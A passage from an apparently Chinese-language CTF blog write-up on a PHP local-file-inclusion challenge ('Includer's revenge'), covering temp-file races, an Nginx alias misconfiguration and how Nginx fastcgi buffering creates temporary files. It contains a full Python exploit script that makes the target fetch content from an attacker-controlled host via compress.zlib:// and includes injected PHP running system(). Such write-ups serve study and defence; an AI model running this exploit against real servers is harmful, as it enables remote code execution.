&#123;&#125;\r</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=asdasdasd\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&#123;&#125;\r</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(data), data))</span><br></pre></td></tr></table></figure>

<p>所以整个流程我们可以总结为以下：</p>
<ol>
<li>利用 <code>compress.zlib://http://</code> or <code>compress.zlib://ftp://</code> 来上传任意文件，并保持 HTTP 长链接竞争保存我们的临时文件</li>
<li>利用超长的 name 溢出 output buffer 得到 sandbox 路径</li>
<li>利用 Nginx 配置错误，通过 .well-known..&#x2F;files&#x2F;sandbox&#x2F;来获取我们 tmp 文件的文件名</li>
<li>发送另一个请求包含我们的 tmp 文件，此时并没有 PHP 代码</li>
<li>绕过 WAF 判断后，发送 PHP 代码段，包含我们的 PHP 代码拿到 Flag</li>
</ol>
<p>整个题目的关键点主要是以下几点(来自 @wupco)：</p>
<ol>
<li>需要利用大文件或ftp速度限制让连接保持</li>
<li>传入name过大 overflow output buffer，在保持连接的情况下获取沙箱路径</li>
<li>tmp文件需要在两种文件直接疯狂切换，使得第一次 <code>file_get_contents</code> 获取的内容不带有 <code>&lt;?</code>,include的时候是正常php代码，需要卡时间点，所以要多跑几次才行</li>
<li><code>.well-known../files/</code> 是nginx配置漏洞，就不多说了，用来列生成的tmp文件</li>
</ol>
<p>完整脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> gg <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line"></span><br><span class="line">    r = remote(<span class="string">&quot;192.168.34.1&quot;</span>, <span class="number">8004</span>)</span><br><span class="line">    l = listen(<span class="number">8080</span>)</span><br><span class="line">    </span><br><span class="line">    data = <span class="string">&#x27;&#x27;&#x27;name=&#123;&#125;&amp;file=compress.zlib://http://192.168.151.132:8080&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&quot;a&quot;</span>*<span class="number">8050</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.34.1:8004</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=asdasdasd</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">&#123;&#125;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(data), data).replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    r.send(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;your sandbox: &#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[ERROR]: EOFERROR&quot;</span>)</span><br><span class="line">        <span class="comment"># l.close()</span></span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># dirname = r.recv(70)</span></span><br><span class="line">    dirname = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>) + <span class="string">&#x27;/&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[DEBUG]:&quot;</span> + dirname)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send trash</span></span><br><span class="line">    c = l.wait_for_connection()</span><br><span class="line">    resp = <span class="string">&#x27;&#x27;&#x27;HTTP/1.1 200 OK</span></span><br><span class="line"><span class="string">Date: Sun, 29 Dec 2019 05:22:47 GMT</span></span><br><span class="line"><span class="string">Server: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string">Vary: Accept-Encoding</span></span><br><span class="line"><span class="string">Content-Length: 534</span></span><br><span class="line"><span class="string">Content-Type: text/html; charset=UTF-8</span></span><br><span class="line"><span class="string">&#123;&#125;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;A&#x27;</span>* <span class="number">5000000</span>).replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    c.send(resp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get filename</span></span><br><span class="line">    r2 = requests.get(<span class="string">&quot;http://192.168.34.1:8004/.well-known../&quot;</span>+ dirname + <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tmpname = <span class="string">&quot;php&quot;</span> + re.findall(<span class="string">&quot;&gt;php(.*)&lt;\/a&quot;</span>,r2.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[DEBUG]:&quot;</span> + tmpname)</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        l.close()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[ERROR]: IndexErorr&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">job</span>():</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        phpcode = <span class="string">&#x27;wtf&lt;?php system(&quot;/readflag&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        c.send(phpcode)</span><br><span class="line"></span><br><span class="line">    t = threading.Thread(target = job)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># file_get_contents and include tmp file</span></span><br><span class="line">    exp_file = dirname + <span class="string">&quot;/&quot;</span> + tmpname</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[DEBUG]:&quot;</span>+exp_file)</span><br><span class="line">    r3 = requests.post(<span class="string">&quot;http://192.168.34.1:8004/&quot;</span>, data=&#123;<span class="string">&#x27;file&#x27;</span>:exp_file&#125;)</span><br><span class="line">    <span class="built_in">print</span>(r3.status_code,r3.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;wtf&quot;</span> <span class="keyword">in</span> r3.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    t.join()</span><br><span class="line">    r.close()</span><br><span class="line">    l.close()</span><br><span class="line">    <span class="comment">#r.interactive()</span></span><br></pre></td></tr></table></figure>

<p>其中 192.168.34.1 是本地题目地址，192.168.151.132 是 client 的地址。</p>
<p>回到Includer’s revenge这题</p>
<p>这里既然标了 revenge 肯定说明有一些不同的地方，结合题目给我们的附件，我们可以发现相对上一次 includer 题目有了比较大区别，主要在 Dockerfile 里面：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RUN chown -R root:root /var/www &amp;&amp; \</span><br><span class="line">    find /var/www -type d -exec chmod 555 &#123;&#125; \; &amp;&amp; \</span><br><span class="line">    find /var/www -type f -exec chmod 444 &#123;&#125; \; &amp;&amp; \</span><br><span class="line">    chown -R root:root /tmp /var/tmp /var/lib/php/sessions &amp;&amp; \</span><br><span class="line">    chmod -R 000 /tmp /var/tmp /var/lib/php/sessions</span><br></pre></td></tr></table></figure>

<p>出题人这里竟然狠心把 php tmp 目录以及一些临时目录都弄得不可写了，所以导致之前题目的产生临时文件的方法就失效了。</p>
<p>所以很明显，我们需要找到另一个产生临时文件，将其包含的方法。</p>
<p>在 Dockerfile 中注意到出题人有一行可能类似于 Tip 的操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN ! find / -writable -or -user $(id -un) -or -group $(id -Gn|sed -e &#x27;s/ / -or -group /g&#x27;) 2&gt; /dev/null | grep -Ev -m 1 &#x27;^(/dev/|/run/|/proc/|/sys/|/var/lock|/var/log/nginx/error.log|/var/log/nginx/access.log)</span><br></pre></td></tr></table></figure>

<p>既然我们要找一个 www-data 用户可写的地方，我们可以参考这个命令把系统中所有的都找出来，看看有没有什么猫腻：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/dev/core</span><br><span class="line">/dev/stderr</span><br><span class="line">/dev/stdout</span><br><span class="line">/dev/stdin</span><br><span class="line">/dev/fd</span><br><span class="line">/dev/ptmx</span><br><span class="line">/dev/urandom</span><br><span class="line">/dev/zero</span><br><span class="line">/dev/tty</span><br><span class="line">/dev/full</span><br><span class="line">/dev/random</span><br><span class="line">/dev/null</span><br><span class="line">/dev/shm</span><br><span class="line">/dev/mqueue</span><br><span class="line">/dev/pts/1</span><br><span class="line">/dev/pts/ptmx</span><br><span class="line">/run/lock</span><br><span class="line">/run/php</span><br><span class="line">/run/php/php7.4-fpm.sock</span><br><span class="line">/run/php/php7.4-fpm.pid</span><br><span class="line">/proc/keys</span><br><span class="line">/proc/kcore</span><br><span class="line">/proc/timer_list</span><br><span class="line">/proc/sched_debug</span><br><span class="line">/var/lock</span><br><span class="line">/var/lib/nginx/scgi</span><br><span class="line">/var/lib/nginx/body</span><br><span class="line">/var/lib/nginx/uwsgi</span><br><span class="line">/var/lib/nginx/proxy</span><br><span class="line">/var/lib/nginx/fastcgi</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line">/var/log/nginx/error.log</span><br></pre></td></tr></table></figure>

<p>以上略去了很多 <code>/proc/xxxx</code> ，所以挨个看下来，很明显，似乎后面 nginx 的可能就是我们要的答案，我们可以在网络上搜索一下相关目录用来干嘛的，最后发现 <code>/var/lib/nginx/fastcgi</code> 目录是 Nginx 的 <code>http-fastcgi-temp-path</code> ，看到 temp 这里就感觉很有意思了，意味着我们可能通过 Nginx 来产生一些文件，并且通过一些搜索我们知道这些临时文件格式是: <code>/var/lib/nginx/fastcgi/x/y/0000000yx</code></p>
<p>那这临时文件用来干嘛呢？通过阅读 Nginx 文档 fastcgi_buffering 部分：</p>
<blockquote>
<p>Syntax:	fastcgi_buffering on | off;<br>Default:	fastcgi_buffering on;<br>Context:	http, server, location</p>
<p>This directive appeared in version 1.5.6.</p>
<p>Enables or disables buffering of responses from the FastCGI server.</p>
<p>When buffering is enabled, nginx receives a response from the FastCGI server as soon as possible, saving it into the buffers set by the fastcgi_buffer_size and fastcgi_buffers directives. If the whole response does not fit into memory, a part of it can be saved to a temporary file on the disk. Writing to temporary files is controlled by the fastcgi_max_temp_file_size and fastcgi_temp_file_write_size directives</p>
<p>When buffering is disabled, the response is passed to a client synchronously, immediately as it is received. nginx will not try to read the whole response from the FastCGI server. The maximum size of the data that nginx can receive from the server at a time is set by the fastcgi_buffer_size directive.</p>
<p>Buffering can also be enabled or disabled by passing “yes” or “no” in the “X-Accel-Buffering” response header field. This capability can be disabled using the fastcgi_ignore_headers directive.</p>
</blockquote>
<p>我们大致可以知道当 Nginx 接收来自 FastCGI 的响应时，若大小超过限定值不适合以内存的形式来存储的时候，一部分就会以临时文件的方式保存到磁盘上。</p>
<p>再通过一些资料了解到这个阈值的大小大概在 32KB 左右，并且又根据 <a target="_blank" rel="noopener" href="https://0xstubs.org/risks-of-nginx-fastcgi-buffering-or-how-itunes-can-mess-with-your-nextcloud-server/">Risks of nginx fastcgi buffering or, how iTunes can mess with your Nextcloud server</a> 文章我们可以知道 Nginx 确实可以在 <code>/var/lib/nginx/fastcgi</code> 下产生临时文件。</p>
<p>那么接下来我们只需要简单验证一下，并看一下临时文件内容是什么。我这里简单使用了 python 产生了一个有顺序内容的 tmp 文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;tmp&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500000</span>):</span><br><span class="line">    file.write(<span class="string">&quot;%5s&quot;</span> % <span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure>

<p>尝试测试，发现虽然产生了文件夹，但是没有文件，于是我加上了 inotify 监控一下文件行动，并且可以使用 strace 进一步确认：<br><img src="/2025/09/04/A%20New%20Novel%20LFI/1.png" alt="alt text"></p>
<p>我们可以从 inotify 中看到，几乎 Nginx 是创建完文件就立即删除了，但是我们可以基本确认 Nginx 确实可以产生临时文件，只不过创建就被删除了导致我们无法判断文件内容到底是啥。</p>
<p>同时我们可以发现 Niginx 创建临时文件有所规律，为了检查文件内容，我们可以计算出下一次 Nginx 产生临时文件的位置，再对其上级目录使用 <code>chattr +a</code> 临时禁止临时文件删除，这样我们就可以看到文件内容了：</p>
<p><img src="/2025/09/04/A%20New%20Novel%20LFI/2.png" alt="alt text"></p>
<p>可以看到临时文件内容就是我们远程 vps 上放的 tmp 文件内容的一部分。</p>
<p>How Nginx Produce Tmp Files</p>
<p>接着问题来了：为什么 Nginx 创建文件就立即删除了？有没有窗口期？能不能使用竞争包含呢？</p>
<p>为了弄懂这些问题，便只能直接看 Nginx 源码了，于是直接参考一些 debug 教程弄一个 debug 环境起来即可。</p>
<p>Nginx 关于临时文件的地方并不多，不难找到 <code>ngx_open_tempfile</code> 这个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ngx_fd_t</span></span><br><span class="line"><span class="title function_">ngx_open_tempfile</span><span class="params">(u_char *name, <span class="type">ngx_uint_t</span> persistent, <span class="type">ngx_uint_t</span> access)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ngx_fd_t</span>  fd;</span><br><span class="line"></span><br><span class="line">    fd = open((<span class="type">const</span> <span class="type">char</span> *) name, O_CREAT|O_EXCL|O_RDWR,</span><br><span class="line">              access ? access : <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd != <span class="number">-1</span> &amp;&amp; !persistent) &#123;</span><br><span class="line">        (<span class="type">void</span>) unlink((<span class="type">const</span> <span class="type">char</span> *) name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Fastcgi 产生临时文件时候的调用栈：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ngx_create_temp_file(ngx_file_t * file, ngx_path_t * path, ngx_pool_t * pool, ngx_uint_t persistent, ngx_uint_t clean, ngx_uint_t access) (/home/zeddy/Desktop/nginx-1.18.0/src/core/ngx_file.c:143)</span><br><span class="line">ngx_write_chain_to_temp_file(ngx_temp_file_t * tf, ngx_chain_t * chain) (/home/zeddy/Desktop/nginx-1.18.0/src/core/ngx_file.c:114)</span><br><span class="line">ngx_event_pipe_write_chain_to_temp_file(ngx_event_pipe_t * p) (/home/zeddy/Desktop/nginx-1.18.0/src/event/ngx_event_pipe.c:843)</span><br><span class="line">ngx_event_pipe_read_upstream(ngx_event_pipe_t * p) (/home/zeddy/Desktop/nginx-1.18.0/src/event/ngx_event_pipe.c:277)</span><br><span class="line">ngx_event_pipe(ngx_event_pipe_t * p, ngx_int_t do_write) (/home/zeddy/Desktop/nginx-1.18.0/src/event/ngx_event_pipe.c:49)</span><br><span class="line">ngx_http_upstream_process_upstream(ngx_http_request_t * r, ngx_http_upstream_t * u) (/home/zeddy/Desktop/nginx-1.18.0/src/http/ngx_http_upstream.c:3944)</span><br><span class="line">ngx_http_upstream_handler(ngx_event_t * ev) (/home/zeddy/Desktop/nginx-1.18.0/src/http/ngx_http_upstream.c:1286)</span><br><span class="line">ngx_epoll_process_events(ngx_cycle_t * cycle, ngx_msec_t timer, ngx_uint_t flags) (/home/zeddy/Desktop/nginx-1.18.0/src/event/modules/ngx_epoll_module.c:901)</span><br><span class="line">ngx_process_events_and_timers(ngx_cycle_t * cycle) (/home/zeddy/Desktop/nginx-1.18.0/src/event/ngx_event.c:247)</span><br><span class="line">ngx_single_process_cycle(ngx_cycle_t * cycle) (/home/zeddy/Desktop/nginx-1.18.0/src/os/unix/ngx_process_cycle.c:310)</span><br><span class="line">main(int argc, char * const * argv) (/home/zeddy/Desktop/nginx-1.18.0/src/core/nginx.c:379)</span><br></pre></td></tr></table></figure>

<p>我们从中可以知道如果要让 Nginx 保存临时文件，得满足一个 if 条件，然而我们仔细看该条件，由于是与条件，我们可以知道得同时满足才能进入该 if 条件，我们分析一下该 if 条件</p>
<ul>
<li><code>fd != -1</code> : <code>fd</code> 是 <code>open</code> 函数的返回值，我们可以知道只有当 <code>open</code> 函数打开失败的时候才会返回 -1 ，也就是该临时文件不存在的情况下，换句话说就是只要临时文件被 <code>open</code> 函数成功打开，这个条件就是成立的</li>
<li><code>persistent</code> : 该条件从函数上下文我们看不出来有什么关系，需要更进一步分析，通过分析代码，我们可以发现该变量主要在以下三个地方可能被赋值为 1 ：<ul>
<li>一个地方是 src&#x2F;http&#x2F;ngx_http_request_body.c#456 处：<code>tf-&gt;persistent = r-&gt;request_body_in_persistent_file</code>;</li>
<li>另一个地方是 src&#x2F;http&#x2F;ngx_http_upstream.c#4087 处: <code>tf-&gt;persistent = 1</code>;</li>
<li>还有一个地方是 src&#x2F;http&#x2F;ngx_http_upstream.c#3144 处: <code>p-&gt;temp_file-&gt;persistent = 1</code>;</li>
</ul>
</li>
</ul>
<p>我们分别对这几个地方进行详细分析及跟进。</p>
<!-- flag of hidden posts --></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io/2025/09/04/A%20New%20Novel%20LFI/">https://sakuraraindrop.github.io/2025/09/04/A%20New%20Novel%20LFI/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sakuraraindrop.github.io" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/include/">include</a></div><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2025/08/17/LilCTF/" title="LilCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-17</div><div class="info-item-2">LilCTF</div></div></div></a><a class="pagination-related no-desc" href="/2025/09/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025/" title="湾区杯2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-08</div><div class="info-item-2">湾区杯2025</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">147</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sakuraraindrop"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#A-New-Novel-LFI"><span class="toc-number">1.</span> <span class="toc-text">A New Novel LFI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#TL-DR"><span class="toc-number">1.1.</span> <span class="toc-text">TL;DR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Includer%E2%80%99s-revenge-Nginx-Fastcgi-Temp-LFI"><span class="toc-number">1.2.</span> <span class="toc-text">Includer’s revenge - Nginx Fastcgi Temp LFI</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/17/reverse-learning/" title="reverse-learning">reverse-learning</a><time datetime="2025-10-17T04:52:59.000Z" title="发表于 2025-10-17 12:52:59">2025-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/09/hackasat-2020-quals/" title="hackasat-2020-quals">hackasat-2020-quals</a><time datetime="2025-10-09T06:51:05.000Z" title="发表于 2025-10-09 14:51:05">2025-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/02/20251002%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/" title="20251002论文精读">20251002论文精读</a><time datetime="2025-10-02T09:04:55.000Z" title="发表于 2025-10-02 17:04:55">2025-10-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/30/hackasat-2022-quals/" title="hackasat-2022-quals">hackasat-2022-quals</a><time datetime="2025-09-30T12:06:48.000Z" title="发表于 2025-09-30 20:06:48">2025-09-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/27/20250927%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250927随缘刷题">20250927随缘刷题</a><time datetime="2025-09-27T04:45:15.000Z" title="发表于 2025-09-27 12:45:15">2025-09-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const loadMathjax = () => {
    if (!window.MathJax) {
      window.MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']],
          tags: 'none',
        },
        chtml: {
          scale: 1.1
        },
        options: {
          enableMenu: true,
          renderActions: {
            findScript: [10, doc => {
              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
                const display = !!node.type.match(/; *mode=display/)
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
                const text = document.createTextNode('')
                node.parentNode.replaceChild(text, node)
                math.start = {node: text, delim: '', n: 0}
                math.end = {node: text, delim: '', n: 0}
                doc.math.push(math)
              }
            }, '']
          }
        }
      }

      const script = document.createElement('script')
      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
      script.id = 'MathJax-script'
      script.async = true
      document.head.appendChild(script)
    } else {
      MathJax.startup.document.state(0)
      MathJax.texReset()
      MathJax.typesetPromise()
    }
  }

  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>